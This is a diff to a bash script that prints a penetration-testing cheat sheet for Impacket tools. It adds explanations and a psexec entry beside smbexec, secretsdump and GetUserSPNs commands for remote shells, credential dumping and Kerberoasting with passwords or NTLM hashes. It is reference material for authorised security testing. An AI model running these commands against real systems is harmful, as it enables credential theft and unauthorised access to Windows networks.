@@ -10,17 +10,28 @@ End='\033[0m'		 # No Color
 Point='\033[0;31m[*]\033[0m'
 
 echo -e "${Frame}###${End} ${Title}Impacket-SMBExec${End} ${Frame}###${End}"
+echo -e "${Comment}Impacket’s smbexec.py will give you an interactive shell on the Windows host.${End}"
 echo -e "${Point} impacket-smbexec domain.local/\$user:\$password@\$IP"
 echo -e ""
 
 
+echo -e "${Frame}###${End} ${Title}Impacket-PsExec${End} ${Frame}###${End}"
+echo -e "${Comment}Impacket’s psexec.py offers psexec like functionality and will give you an interactive shell on the Windows host.${End}"
+echo -e "${Point} impacket-psexec domain.local/\$user:\$password@\$IP"
+echo -e ""
+
+
 echo -e "${Frame}###${End} ${Title}Impacket-SecretsDump${End} ${Frame}###${End}"
-echo -e "${Point} impacket-secretsdump domain.local/\$user:\$password@\$IP"
+echo -e "${Comment}Impacket’s secretsdump.py will dump secrets from the remote machine without executing any agent.${End}"
+echo -e "${Point} impacket-secretsdump domain.local/\$admin_user:\$password@\$IP"
 echo -e "${Point} impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL"
 echo -e ""
 
 
 echo -e "${Frame}###${End} ${Title}Impacket-GetUserSPNs${End} ${Frame}###${End}"
+echo -e "${Comment}Impacket’s GetUserSPNs.py will return a ticket that is encrypted with the user account’s password, which can then be bruteforced offline.${End}"
 echo -e "${Point} impacket-GetUserSPNs -request -dc-ip \$IP domain.local/\$user:\$password -outputfile hashes.kerberoast"
 echo -e "${Point} impacket-GetUserSPNs -request -dc-ip \$IP -hashes \$LMHASH:\$NTHASH domain.local/\$user -outputfile hashes.kerberoast"
+
+
 
